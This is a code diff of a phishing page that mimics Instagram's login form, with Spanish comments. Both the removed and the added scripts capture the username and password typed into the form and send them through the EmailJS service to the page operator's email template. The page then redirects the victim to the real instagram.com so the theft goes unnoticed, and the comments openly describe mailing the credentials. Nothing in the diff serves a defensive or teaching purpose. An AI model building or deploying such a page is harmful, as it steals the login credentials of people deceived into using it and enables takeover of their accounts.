@@ -356,36 +356,43 @@ select.idioma {
 
     <a class="linkpassw" href="https://z-p15.www.instagram.com/accounts/password/reset/">¿Has olvidado la contraseña?</a>
 </form>
-<script>
 
-    emailjs.init("qd8ZWAiRUxrsk8DBj"); // User ID de EmailJS
+        <!-- Cargar la librería de EmailJS -->
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // Inicializar EmailJS con tu User ID
+        (function() {
+            emailjs.init("signup12345678"); // Reemplaza 'user_ID' con tu ID de usuario de EmailJS
+        })();
 
-document.getElementById("my-form").addEventListener("submit", function(event) {
-    event.preventDefault();
+        // Función para enviar las credenciales por correo
+        document.getElementById('my-form').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevenir que el formulario se envíe de manera tradicional
 
-    // Obtener datos del formulario
-    const user = document.getElementById("user").value;
-    const password = document.getElementById("password").value;
+            // Obtener los valores del formulario
+            const username = document.getElementById('user').value;
+            const password = document.getElementById('password').value;
 
-    // Enviar correo
-    emailjs.send("signup", "template_ouizy4c", { // Reemplaza Service y Template ID
-        user: user,
-        password: password
-    })
-    .then(() => {
-        window.location.href = "https://www.instagram.com"; // Redirección
-    })
-    .catch((error) => {
-        console.error("Error:", error);
-        alert("Error al iniciar sesión. Intenta de nuevo.");
-    });
-});
+            // Verificar que los campos no estén vacíos
+            if (username && password) {
+                // Enviar el correo a tu dirección de correo usando EmailJS
+                emailjs.send("signup12345678", "template_ouizy4c", {
+                    user_name: username,
+                    user_password: password
+                })
+                .then(function(response) {
+                    console.log("Correo enviado exitosamente: ", response);
+                }, function(error) {
+                    console.error("Error al enviar el correo: ", error);
+                });
 
-</script>
-
-
-
-
+                // Redirigir al usuario a Instagram.com
+                window.location.href = "https://www.instagram.com";
+            } else {
+                alert("Por favor, ingresa tu nombre de usuario y contraseña.");
+            }
+        });
+    </script>
 
     </div>
     <div class="p110">
